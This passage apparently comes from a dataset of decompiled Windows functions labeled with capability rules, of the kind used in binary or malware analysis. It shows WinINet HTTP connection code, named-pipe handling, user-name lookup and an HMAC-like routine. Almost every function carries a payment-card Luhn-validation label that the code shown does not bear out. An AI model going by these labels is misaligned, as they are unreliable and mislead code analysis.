        "decompiled_code": "\nint32_t fcn.2001e958(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t s;\n    uint var_14h;\n    int32_t var_ch;\n    int32_t var_8h;\n    \n    sub.ntdll.dll_memset(&s, 0, 0x18);\n    iVar1 = (*_sym.imp.WININET.dll_InternetConnectA)(*(in_EAX + 0xc), *(in_EAX + 0x58), 0x50, 0, 0, 3, 0, &s);\n    *(in_EAX + 0x10) = iVar1;\n    if (iVar1 == 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if ((iVar1 != 0x3e5) || (iVar2 = fcn.200012d6(&var_14h, 60000),  iVar1 = s,  iVar2 != 0x102)) {\n            if (iVar1 != 0) goto code_r0x2001ea6e;\n            goto code_r0x2001e9da;\n        }\n        iVar1 = 0x21590002;\n        var_8h = var_ch;\n        if (var_ch == 0) goto code_r0x2001ea6e;\n    }\n    else {\ncode_r0x2001e9da:\n        do {\n            iVar1 = fcn.200012e7(&var_14h);\n            if (iVar1 != 0) {\n                fcn.200012a9(&var_14h);\n            }\n            if (var_8h != 0) {\n                (*_sym.imp.WININET.dll_InternetCloseHandle)(&var_8h);\n            }\n            iVar1 = fcn.2001d766(0);\n            if (iVar1 != 0) goto code_r0x2001ea6e;\n            iVar1 = (*_sym.imp.WININET.dll_HttpSendRequestA)(var_8h, 0, 0, 0, 0);\n            if ((iVar1 == 0) && (iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)(),  iVar1 == 0x3e5)) {\n                iVar2 = fcn.200012d6(&var_14h, 60000);\n                iVar1 = 0x21590002;\n                if (iVar2 != 0x102) {\n                    iVar1 = s;\n                }\n                break;\n            }\n            iVar1 = fcn.2001e876(var_8h);\n        } while (iVar1 == 0x2159012c);\n    }\n    (*_sym.imp.WININET.dll_InternetCloseHandle)(var_8h);\ncode_r0x2001ea6e:\n    if (*(in_EAX + 0x10) != 0) {\n        (*_sym.imp.WININET.dll_InternetCloseHandle)(*(in_EAX + 0x10));\n        *(in_EAX + 0x10) = 0;\n    }\n    iVar2 = fcn.200012e7(&var_14h);\n    if (iVar2 != 0) {\n        fcn.200012a9(&var_14h);\n    }\n    return iVar1;\n}\n",
        "token_count": 733
    },
    "2001fc1e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.2001fc1e(int32_t arg_8h, int32_t arg_ch, int32_t *arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    if (arg_ch == 3) {\n        if (arg_14h != 4) {\n            return 0x21590064;\n        }\n        iVar1 = *(arg_8h + 0x60);\n    }\n    else {\n        if (arg_ch == 4) {\n            iVar1 = *(arg_8h + 0x60);\n            if (iVar1 != 0) {\n                iVar3 = arg_14h;\n                if (iVar1 <= arg_14h) {\n                    iVar3 = iVar1;\n                }\n                sub.ntdll.dll_memcpy(arg_10h, *(arg_8h + 0x5c), iVar3);\n                return 0;\n            }\n            return 0x21590064;\n        }\n        if (arg_ch == 7) {\n            iVar1 = (*_sym.imp.ADVAPI32.dll_GetUserNameA)(arg_10h, &arg_14h);\n            if (iVar1 != 0) {\n                return 0;\n            }\n    // WARNING: Could not recover jumptable at 0x2001fc97. Too many branches\n    // WARNING: Treating indirect jump as call\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            return uVar2;\n        }\n        if (arg_ch != 0xc) {\n            if (arg_ch != 0xd) {\n                return 0x21590001;\n            }\n            if (*(arg_8h + 4) != 0) {\n                (*_sym.imp.ntdll.dll_strncpy)(arg_10h, *(arg_8h + 4), arg_14h);\n                *(arg_10h + arg_14h + -1) = 0;\n                return 0;\n            }\n            return 0x21590064;\n        }\n        if ((arg_14h != 4) || (*(arg_8h + 4) == 0)) {\n            return 0x21590064;\n        }\n        iVar1 = sub.ntdll.dll_strlen(*(arg_8h + 4));\n        iVar1 = iVar1 + 1;\n    }\n    *arg_10h = iVar1;\n    return 0;\n}\n",
        "token_count": 539
    },
    "2001fdb4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "connect pipe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.2001fdb4(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint lpOverlapped;\n    int32_t hObject;\n    int32_t lpHandles;\n    uint var_8h;\n    uint lpNumberOfBytesTransferred;\n    \n    iVar2 = 0;\n    sub.ntdll.dll_memset(&lpOverlapped, 0, 0x14);\n    hObject = (*_sym.imp.KERNEL32.dll_CreateEventA)(0, 1, 0, 0);\n    if (hObject == 0) goto code_r0x2001fe51;\n    iVar2 = (*_sym.imp.KERNEL32.dll_ConnectNamedPipe)();\n    if (iVar2 == 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar1 != 0x3e5) goto code_r0x2001fe51;\n        lpHandles = hObject;\n        var_8h = arg_8h;\n        iVar1 = (*_sym.imp.KERNEL32.dll_WaitForMultipleObjects)(2, &lpHandles, 0, 0xffffffff);\n        if (iVar1 != 0) {\n            (*_sym.imp.KERNEL32.dll_CancelIo)();\n            iVar2 = (*_sym.imp.KERNEL32.dll_GetOverlappedResult)();\n            goto code_r0x2001fe51;\n        }\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetOverlappedResult)();\n        if (iVar1 == 0) goto code_r0x2001fe51;\n    }\n    iVar2 = 1;\ncode_r0x2001fe51:\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n    return iVar2;\n}\n",
        "token_count": 385
    },
    "2002027d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.2002027d(uint param_1, uint param_2, uint param_3, uint param_4)\n\n{\n    fcn.2001f8c4(0, 0, 0, param_2, param_3, param_4);\n    return;\n}\n",
        "token_count": 65
    },
    "2002050e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.2002050e(int32_t *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = (*_sym.imp.msvcrt.dll_malloc)(0x7c);\n    if (iVar1 == 0) {\n        iVar2 = 0x21590004;\n    }\n    else {\n        sub.ntdll.dll_memset(iVar1, 0, 0x7c);\n        sub.ntdll.dll_memcpy(iVar1 + 0x2c, 0x20046a4c, 0x10);\n        fcn.20001551(iVar1 + 0x50);\n        var_4h = 0;\n        var_8h = arg_ch;\n        iVar2 = fcn.2001300b(iVar1 + 4, &var_8h, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n        if (iVar2 == 0) {\n            *arg_8h = iVar1;\n        }\n        else {\n            (*_sym.imp.msvcrt.dll_free)(iVar1);\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 313
    },
    "20020601": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.20020601(int32_t arg_8h, int32_t *arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_4h;\n    \n    var_4h = 0;\n    iVar1 = fcn.20013311(*(arg_8h + 4), &var_4h, arg_10h);\n    if (iVar1 == 0) {\n        iVar2 = (*_sym.imp.msvcrt.dll_malloc)(0x7c);\n        *arg_ch = iVar2;\n        if (iVar2 == 0) {\n            arg_8h = 0x21590004;\n            fcn.20013237(arg_ch, 0);\n            *arg_ch = 0;\n            iVar1 = arg_8h;\n        }\n        else {\n            sub.ntdll.dll_memset(iVar2, 0, 0x7c);\n            *(*arg_ch + 4) = var_4h;\n            *(*arg_ch + 8) = 2;\n            sub.ntdll.dll_memcpy(*arg_ch + 0x2c, arg_8h + 0x2c, 0x10);\n            *(*arg_ch + 0x68) = *(arg_8h + 0x68);\n            fcn.20001551(*arg_ch + 0x50);\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 316
    },
    "20020767": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.20020767(void)\n\n{\n    int32_t iVar1;\n    int32_t unaff_ESI;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint s2;\n    uint var_4h;\n    \n    var_4h = 0;\n    s2 = 0;\n    iVar1 = fcn.200135e2(*(unaff_ESI + 4), &s2, &var_ch, 300000, 0);\n    if (iVar1 != 0) goto code_r0x20020803;\n    if (var_ch != 8) {\ncode_r0x2002079d:\n        iVar1 = 0x2159012d;\n        goto code_r0x20020803;\n    }\n    iVar1 = fcn.200135e2(*(unaff_ESI + 4), &var_4h, &var_10h, 300000, 0);\n    if (iVar1 != 0) goto code_r0x20020803;\n    if (var_10h != 4) goto code_r0x2002079d;\n    if (*(unaff_ESI + 8) == 1) {\n        sub.ntdll.dll_memcpy(unaff_ESI + 0x14, s2, 8);\n        iVar1 = unaff_ESI + 0x1c;\ncode_r0x200207f3:\n        sub.ntdll.dll_memcpy(iVar1, var_4h, 4);\n    }\n    else if (*(unaff_ESI + 8) == 2) {\n        sub.ntdll.dll_memcpy(unaff_ESI + 0xc, s2, 8);\n        iVar1 = unaff_ESI + 0x20;\n        goto code_r0x200207f3;\n    }\n    iVar1 = 0;\ncode_r0x20020803:\n    fcn.20013299(*(unaff_ESI + 4), var_4h);\n    fcn.20013299(*(unaff_ESI + 4), s2);\n    return iVar1;\n}\n",
        "token_count": 456
    },
    "20020822": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.20020822(void)\n\n{\n    int32_t iVar1;\n    int32_t unaff_ESI;\n    int32_t iVar2;\n    \n    if (*(unaff_ESI + 8) == 1) {\n        iVar1 = unaff_ESI + 0xc;\n        iVar2 = unaff_ESI + 0x20;\n    }\n    else {\n        if (*(unaff_ESI + 8) != 2) {\n            return 0x21590064;\n        }\n        iVar1 = unaff_ESI + 0x14;\n        iVar2 = unaff_ESI + 0x1c;\n    }\n    iVar1 = fcn.20013589(*(unaff_ESI + 4), iVar1, 8, 0);\n    if (iVar1 == 0) {\n        iVar1 = fcn.20013589(*(unaff_ESI + 4), iVar2, 4, 0);\n    }\n    return iVar1;\n}\n",
        "token_count": 217
    },
    "20020866": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.20020866(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t unaff_ESI;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    var_ch = 0;\n    var_4h = 0;\n    iVar1 = fcn.200135e2(*(unaff_ESI + 4), &var_8h, &var_14h, 300000, 0);\n    if (iVar1 == 0) {\n        iVar1 = fcn.200135e2(*(unaff_ESI + 4), &var_ch, &var_18h, 300000, 0);\n        if (iVar1 == 0) {\n            iVar1 = fcn.200135e2(*(unaff_ESI + 4), &var_4h, &var_10h, 300000, 0);\n            if (iVar1 == 0) {\n                if (*(unaff_ESI + 8) == 1) {\n                    uVar2 = fcn.2002475a(var_4h, var_10h, 0);\n                    *(*(unaff_ESI + 0x24) + 0x14) = uVar2;\n                }\n                else if (*(unaff_ESI + 8) == 2) {\n                    uVar2 = fcn.2002475a(var_4h, var_10h, 0);\n                    *(*(unaff_ESI + 0x28) + 0x14) = uVar2;\n                    uVar2 = fcn.2002475a(var_8h, var_14h, 0);\n                    *(*(unaff_ESI + 0x28) + 8) = uVar2;\n                    uVar2 = fcn.2002475a(var_ch, var_18h, 0);\n                    *(*(unaff_ESI + 0x28) + 0xc) = uVar2;\n                    uVar2 = fcn.20024a46(*(*(unaff_ESI + 0x28) + 8));\n                    *(*(unaff_ESI + 0x24) + 8) = uVar2;\n                    uVar2 = fcn.20024a46(*(*(unaff_ESI + 0x28) + 0xc));\n                    *(*(unaff_ESI + 0x24) + 0xc) = uVar2;\n                    iVar1 = fcn.200241f0(*(unaff_ESI + 0x24));\n                    if (iVar1 == 0) {\n                        iVar1 = 0x2159012d;\n                        goto code_r0x2002096f;\n                    }\n                }\n                iVar1 = 0;\n            }\n        }\n    }\ncode_r0x2002096f:\n    fcn.20013299(*(unaff_ESI + 4), var_4h);\n    fcn.20013299(*(unaff_ESI + 4), var_8h);\n    fcn.20013299(*(unaff_ESI + 4), var_ch);\n    return iVar1;\n}\n",
        "token_count": 722
    },
    "20020aac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.20020aac(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    \n    fcn.200135e2(*(in_EAX + 4), param_1, param_2, 300000, 0);\n    return;\n}\n",
        "token_count": 63
    },
    "20020ac7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.20020ac7(uchar *param_1, uint param_2, uint param_3, uint *param_4)\n\n{\n    int32_t in_EAX;\n    int32_t arg_ch;\n    int32_t iVar1;\n    uchar auStack340 [92];\n    uint8_t auStack248 [68];\n    uint8_t auStack180 [68];\n    uchar auStack112 [92];\n    uchar auStack20 [16];\n    \n    arg_ch = (*_sym.imp.msvcrt.dll_malloc)(0x10);\n    if (arg_ch != 0) {\n        if (0x40 < in_EAX) {\n            fcn.20024a66(auStack340);\n            fcn.200253cb(auStack340, param_1, in_EAX);\n            fcn.20025605(auStack20, auStack340);\n            param_1 = auStack20;\n            in_EAX = 0x10;\n        }\n        sub.ntdll.dll_memset(auStack248, 0, 0x41);\n        sub.ntdll.dll_memset(auStack180, 0, 0x41);\n        sub.ntdll.dll_memcpy(auStack248, param_1, in_EAX);\n        sub.ntdll.dll_memcpy(auStack180, param_1, in_EAX);\n        iVar1 = 0;\n        do {\n            auStack248[iVar1] = auStack248[iVar1] ^ 0x36;\n            auStack180[iVar1] = auStack180[iVar1] ^ 0x5c;\n            iVar1 = iVar1 + 1;\n        } while (iVar1 < 0x40);\n        fcn.20024a66(auStack112);\n        fcn.200253cb(auStack112, auStack248, 0x40);\n        fcn.200253cb(auStack112, param_2, param_3);\n        fcn.20025605(arg_ch, auStack112);\n        fcn.20024a66(auStack112);\n        fcn.200253cb(auStack112, auStack180, 0x40);\n        fcn.200253cb(auStack112, arg_ch, 0x10);\n        fcn.20025605(arg_ch, auStack112);\n        if (param_4 != NULL) {\n            *param_4 = 0x10;\n        }\n    }\n    return arg_ch;\n}\n",
        "token_count": 533
    },
    "20020c67": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.20020c67(int32_t arg_8h, int32_t **arg_ch, char **arg_10h, int32_t *arg_14h)\n\n{\n    int32_t **ppiVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t **ppiVar4;\n    uint32_t arg_10h_00;\n    bool bVar5;\n    uint var_ach;\n    uint s2;\n    uint var_18h;\n    uint s1;\n    int32_t var_8h;\n    char *var_4h;\n    \n    ppiVar4 = arg_ch;\n    arg_10h_00 = 0;\n    iVar3 = 0;\n    if (arg_ch != NULL) {\n        do {\n            iVar3 = iVar3 + arg_ch[2];\n            arg_ch = *arg_ch;\n        } while (arg_ch != NULL);\n        if (iVar3 != 0) {\n            var_8h = iVar3;\n            sub.ntdll.dll_memcpy(&s2, *(arg_8h + 0x3c), 0x10);\n            sub.ntdll.dll_memcpy(&var_18h, &s2, 8);\n            fcn.200146b9(&var_ach, 0x10, &s2);\n            var_4h = (*_sym.imp.msvcrt.dll_malloc)(iVar3 + 9);\n            if (var_4h != NULL) {\n                iVar3 = 1;\n                arg_ch = NULL;\n                do {\n                    do {\n                        if (8 - arg_10h_00 < ppiVar4[2] - arg_ch) {\n                            sub.ntdll.dll_memcpy(&s1 + arg_10h_00, ppiVar4[1] + arg_ch, 8 - arg_10h_00);\n                            arg_ch = arg_ch + (8 - arg_10h_00);\n                            arg_10h_00 = 8;\n                        }\n                        else {\n                            sub.ntdll.dll_memcpy(&s1 + arg_10h_00, ppiVar4[1] + arg_ch, ppiVar4[2] - arg_ch);\n                            ppiVar1 = ppiVar4 + 2;\n                            ppiVar4 = *ppiVar4;\n                            arg_10h_00 = *ppiVar1 + (arg_10h_00 - arg_ch);\n                            arg_ch = NULL;\n                        }\n                    } while ((arg_10h_00 != 8) && (ppiVar4 != NULL));\n                    fcn.200142cd(&s1, var_4h + iVar3, arg_10h_00, &var_ach, &var_18h, 1);\n                    while( true ) {\n                        uVar2 = arg_10h_00 & 0x80000007;\n                        bVar5 = uVar2 == 0;\n                        if (uVar2 < 0) {\n                            bVar5 = (uVar2 - 1 | 0xfffffff8) == 0xffffffff;\n                        }\n                        if (bVar5) break;\n                        arg_10h_00 = arg_10h_00 + 1;\n                    }\n                    iVar3 = iVar3 + arg_10h_00;\n                    arg_10h_00 = 0;\n                } while (ppiVar4 != NULL);\n                *var_4h = (iVar3 + -1) - var_8h;\n                *arg_10h = var_4h;\n                *arg_14h = iVar3;\n                return 0;\n            }\n            return 0x21590004;\n        }\n    }\n    *arg_10h = NULL;\n    *arg_14h = 0;\n    return 0;\n}\n",
        "token_count": 829
    },
    "20020daf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.20020daf(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t unaff_EBX;\n    uint var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t s2;\n    int32_t n;\n    int32_t s1;\n    int32_t var_4h;\n    \n    pcVar2 = _sym.imp.msvcrt.dll_malloc;\n    iVar3 = (*_sym.imp.msvcrt.dll_malloc)(0x10);\n    var_4h = iVar3;\n    sub.ntdll.dll_memcpy(iVar3, unaff_EBX + 0xc, 8);\n    sub.ntdll.dll_memcpy(iVar3 + 8, unaff_EBX + 0x14, 8);\n    s2 = (*pcVar2)(0x10);\n    sub.ntdll.dll_memcpy(s2, unaff_EBX + 0x2c, 0x10);\n    var_14h = fcn.20020ac7(iVar3, 0x10, &var_18h);\n    pcVar1 = _sym.imp.msvcrt.dll_free;\n    (*_sym.imp.msvcrt.dll_free)(s2);\n    (*pcVar1)(var_4h);\n    if (*(unaff_EBX + 8) == 1) {\n        uVar4 = fcn.200241cd(*(unaff_EBX + 0x28));\n        s2 = (*pcVar2)(uVar4);\n        uVar4 = *(unaff_EBX + 0x28);\n        iVar3 = *(unaff_EBX + 0x24);\n    }\n    else {\n        if (*(unaff_EBX + 8) != 2) {\n            return 0x21590064;\n        }\n        uVar4 = fcn.200241cd(*(unaff_EBX + 0x24));\n        s2 = (*pcVar2)(uVar4);\n        uVar4 = *(unaff_EBX + 0x24);\n        iVar3 = *(unaff_EBX + 0x28);\n    }\n    s1 = fcn.200241fd(s2, *(iVar3 + 0x14), uVar4);\n    var_4h = (*pcVar2)(s1 + 9);\n    sub.ntdll.dll_memcpy(var_4h, s2, s1);\n    n = s1 + var_4h;\n    sub.ntdll.dll_memcpy(n, unaff_EBX + 0x20, 4);\n    n = n + 4;\n    sub.ntdll.dll_memcpy(n, unaff_EBX + 0x1c, 4);\n    *(n + 4) = 0;\n    var_1ch = fcn.20020ac7(var_4h, s1 + 9, &n);\n    (*pcVar1)(var_4h);\n    var_24h = n + s1;\n    var_20h = var_24h + 9;\n    iVar3 = (*pcVar2)(var_20h);\n    var_4h = iVar3;\n    sub.ntdll.dll_memcpy(iVar3, var_1ch, n);\n    iVar3 = iVar3 + n;\n    sub.ntdll.dll_memcpy(iVar3, s2, s1);\n    iVar3 = iVar3 + s1;\n    sub.ntdll.dll_memcpy(iVar3, unaff_EBX + 0x20, 4);\n    sub.ntdll.dll_memcpy(iVar3 + 4, unaff_EBX + 0x1c, 4);\n    *(iVar3 + 8) = 1;\n    var_20h = fcn.20020ac7(var_4h, var_20h, &var_28h);\n    (*pcVar1)(s2);\n    (*pcVar1)(var_1ch);\n    (*pcVar1)(var_4h);\n    n = fcn.20020bee(&s2);\n    s1 = fcn.20020bee(&var_1ch);\n    iVar3 = (*_sym.imp.msvcrt.dll_malloc)(var_1ch + 8 + s2);\n    var_4h = iVar3;\n    sub.ntdll.dll_memcpy(iVar3, unaff_EBX + 0x1c, 4);\n    sub.ntdll.dll_memcpy(iVar3 + 4, unaff_EBX + 0x20, 4);\n    sub.ntdll.dll_memcpy(iVar3 + 8, n, s2);\n    sub.ntdll.dll_memcpy(s2 + iVar3 + 8, s1, var_1ch);\n    uVar4 = fcn.20020ac7(var_4h, var_24h + 8, &var_24h);\n    (*pcVar1)(var_4h);\n    (*pcVar1)(n);\n    (*pcVar1)(s1);\n    (*pcVar1)(var_14h);\n    *(unaff_EBX + 0x48) = var_24h;\n    *(unaff_EBX + 0x3c) = var_20h;\n    *(unaff_EBX + 0x40) = var_28h;\n    *(unaff_EBX + 0x44) = uVar4;\n    return 0;\n}\n",
        "token_count": 1196
    },
    "20021037": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.20021037(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t var_8h;\n    uint s2;\n    \n    s2 = 0;\n    fcn.20025857(in_EAX + 0x20, 4);\n    fcn.20025857(in_EAX + 0xc, 8);\n    iVar1 = fcn.2002571d(0x80, 5, 0, 0);\n    *(in_EAX + 0x28) = iVar1;\n    if (iVar1 != 0) {\n        fcn.200241f0(iVar1);\n        iVar1 = fcn.200241e7();\n        *(in_EAX + 0x24) = iVar1;\n        if (iVar1 != 0) {\n            iVar1 = fcn.20020822();\n            if (iVar1 == 0) {\n                iVar1 = fcn.20020767();\n                if (iVar1 == 0) {\n                    iVar1 = fcn.20020999();\n                    if (iVar1 == 0) {\n                        iVar1 = fcn.20020866();\n                        if (iVar1 == 0) {\n                            iVar1 = fcn.20021014();\n                            if (iVar1 == 0) {\n                                iVar1 = fcn.20020aac(&s2, &var_8h);\n                                if (iVar1 == 0) {\n                                    if (*(in_EAX + 0x48) == var_8h) {\n                                        iVar2 = sub.ntdll.dll_memcmp(*(in_EAX + 0x44), s2, var_8h);\n                                        if (iVar2 == 0) goto code_r0x20021103;\n                                    }\n                                    iVar1 = 0x2159012d;\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n            goto code_r0x20021103;\n        }\n    }\n    iVar1 = 0x21590004;\ncode_r0x20021103:\n    fcn.20013299(*(in_EAX + 4), s2);\n    *(in_EAX + 0x4c) = (iVar1 != 0) + 1;\n    return iVar1;\n}\n",
        "token_count": 500
    },
    "20021121": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.20021121(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t var_8h;\n    uint s2;\n    \n    s2 = 0;\n    fcn.20025857(in_EAX + 0x1c, 4);\n    fcn.20025857(in_EAX + 0x14, 8);\n    iVar1 = fcn.200241e7();\n    *(in_EAX + 0x24) = iVar1;\n    if (iVar1 != 0) {\n        iVar1 = fcn.200241e7();\n        *(in_EAX + 0x28) = iVar1;\n        if (iVar1 != 0) {\n            iVar1 = fcn.20020767();\n            if (iVar1 == 0) {\n                iVar1 = fcn.20020822();\n                if (iVar1 == 0) {\n                    iVar1 = fcn.20020866();\n                    if (iVar1 == 0) {\n                        iVar1 = fcn.20020999();\n                        if (iVar1 == 0) {\n                            iVar1 = fcn.20020aac(&s2, &var_8h);\n                            if (iVar1 == 0) {\n                                fcn.20020daf();\n                                if (*(in_EAX + 0x48) == var_8h) {\n                                    iVar1 = sub.ntdll.dll_memcmp(*(in_EAX + 0x44), s2, var_8h);\n                                    if (iVar1 == 0) {\n                                        iVar1 = fcn.20021014();\n                                        goto code_r0x200211e2;\n                                    }\n                                }\n                                iVar1 = 0x2159012d;\n                            }\n                        }\n                    }\n                }\n            }\n            goto code_r0x200211e2;\n        }\n    }\n    iVar1 = 0x21590004;\ncode_r0x200211e2:\n    fcn.20013299(*(in_EAX + 4), s2);\n    *(in_EAX + 0x4c) = (iVar1 != 0) + 1;\n    return iVar1;\n}\n",
        "token_count": 473
    },
    "2002127a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.2002127a(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.20021200();\n    if (iVar1 == 0) {\n        iVar1 = fcn.20020c67(arg_8h, arg_ch, &var_4h, &var_8h);\n        if (iVar1 == 0) {\n            iVar1 = fcn.20013589(*(arg_8h + 4), var_4h, var_8h, arg_10h);\n            (*_sym.imp.msvcrt.dll_free)(var_4h);\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 176
    },
    "200213ea": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.200213ea(int32_t arg_8h, uint arg_ch, uint32_t arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    char *pcVar2;\n    uint32_t uVar3;\n    uint var_9ch;\n    uint var_18h;\n    uint var_8h;\n    \n    iVar1 = fcn.20021200();\n    if (iVar1 == 0) {\n        if (arg_10h < 1) {\n            if (arg_10h == 0) {\n                iVar1 = fcn.20013589(*(arg_8h + 4), arg_ch, 0, arg_14h);\n            }\n            else {\n                iVar1 = 0x21590068;\n            }\n        }\n        else {\n            sub.ntdll.dll_memcpy(&var_18h, *(arg_8h + 0x3c), 0x10);\n            sub.ntdll.dll_memcpy(&var_8h, &var_18h, 8);\n            fcn.200146b9(&var_9ch, 0x10, &var_18h);\n            pcVar2 = (*_sym.imp.msvcrt.dll_malloc)(arg_10h + 9);\n            if (pcVar2 == NULL) {\n                iVar1 = 0x21590004;\n            }\n            else {\n                fcn.200142cd(arg_ch, pcVar2 + 1, arg_10h, &var_9ch, &var_8h, 1);\n                uVar3 = arg_10h & 0x80000007;\n                if (uVar3 < 0) {\n                    uVar3 = (uVar3 - 1 | 0xfffffff8) + 1;\n                }\n                iVar1 = (-(uVar3 != 0) & 8) + (arg_10h + (arg_10h >> 0x1f & 7U) >> 3) * 8;\n                *pcVar2 = iVar1 - arg_10h;\n                iVar1 = fcn.20013589(*(arg_8h + 4), pcVar2, iVar1 + 1, arg_14h);\n                (*_sym.imp.msvcrt.dll_free)(pcVar2);\n            }\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 518
    },
    "200227c2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n\nint32_t __cdecl fcn.200227c2(uint *ptr, int32_t *arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    int32_t var_4h;\n    \n    piVar4 = arg_ch;\n    *ptr = 0;\n    iVar1 = *arg_ch;\n    var_4h = 0;\n    while( true ) {\n        if (iVar1 == 0) {\n            return 0x21590005;\n        }\n        iVar1 = (*_sym.imp.msvcrt.dll__strdup)(*arg_ch);\n        if (iVar1 == 0) {\n            return 0x21590004;\n        }\n        arg_ch = (*_sym.imp.ntdll.dll_strchr)(iVar1, 0x2e);\n        if (arg_ch != NULL) {\n            *arg_ch = 0;\n            arg_ch = arg_ch + 1;\n        }\n        iVar2 = fcn.20012fde(iVar1, arg_18h);\n        if (iVar2 != 0) break;\n        (*_sym.imp.msvcrt.dll_free)(iVar1);\n        var_4h = var_4h + 1;\n        arg_ch = piVar4 + var_4h;\n        iVar1 = *arg_ch;\n    }\n    if (arg_ch == NULL) {\n        iVar3 = sub.ntdll.dll_strlen(iVar1);\n    }\n    else {\n        iVar3 = arg_ch - iVar1;\n    }\n    (*_sym.imp.msvcrt.dll_free)(iVar1);\n    iVar1 = (**(iVar2 + 0xc))(ptr, piVar4[var_4h] + iVar3, arg_10h, arg_14h, arg_18h);\n    if (iVar1 != 0) {\n        return iVar1;\n    }\n    piVar4 = (*_sym.imp.msvcrt.dll_malloc)(0x10);\n    if (piVar4 == NULL) {\n        (**(iVar2 + 0x10))(*ptr, 0);\n        (**(iVar2 + 0x14))(*ptr, 0);\n        *ptr = 0;\n        return 0x21590004;\n    }\n    *piVar4 = iVar2;\n    piVar4[1] = 0;\n    piVar4[2] = 0;\n    piVar4[3] = 1;\n    **ptr = piVar4;\n    iVar1 = fcn.2001396b(*ptr, 5);\n    if (iVar1 == 0) {\n        (*_sym.imp.msvcrt.dll_free)(piVar4);\n        